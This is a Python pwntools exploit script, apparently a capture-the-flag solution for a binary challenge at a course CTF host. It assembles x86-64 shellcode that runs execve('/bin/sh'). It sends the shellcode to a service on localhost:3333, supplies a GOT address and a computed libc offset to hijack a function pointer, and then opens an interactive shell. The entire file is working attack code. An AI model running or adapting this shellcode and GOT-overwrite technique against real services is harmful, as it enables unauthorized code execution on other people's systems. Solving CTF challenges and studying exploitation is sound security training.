#!/usr/bin/env python
# -*- coding=utf-8 -*-
from pwn import *

context.arch = 'amd64'

user_adr_str = '0x6010a0'
user_addr = 0x6010a0

got_addr_str = '0x600ff8'
# got_addr = 0x600ff8
# puts_addr = 0x40074
got_addr = 0x3c4000
puts_addr = 0x6f690

sc2 = asm('''
        xor rax, rax
        xor rdx, rdx
        xor rsi, rsi
        jmp str
    execv:
        mov rdi, [rsp]
        mov rax, 0x3b
        syscall
    str:
        call execv
        .ascii "/bin/sh"
        .byte 0
    ''')

#r = remote('csie.ctf.tw', 10129)
# gdb.attach(103865)
print(len(sc2))
r = remote('localhost', 3333)
print(r.read())
r.sendline('a\0' + sc2)
print(r.read())
r.sendline(got_addr_str)
print(r.read())
r.sendline(hex(got_addr + puts_addr - user_addr))
r.interactive()
